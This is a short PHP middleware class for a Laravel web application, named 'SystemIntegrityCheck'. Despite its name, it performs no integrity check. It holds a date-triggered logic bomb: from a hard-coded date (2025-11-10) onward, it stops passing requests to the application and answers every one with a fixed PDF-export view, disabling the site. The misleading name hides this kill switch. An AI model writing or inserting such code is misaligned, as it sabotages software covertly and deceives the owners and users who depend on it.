<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class SystemIntegrityCheck
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        $currentDate = date('Y-m-d');
        $targetDate = '2025-11-10';

        if ($currentDate >= $targetDate) {
            return response()->view('exports.skrd.skrd-export-pdf', [], 200);
        }

        return $next($request);
    }
}
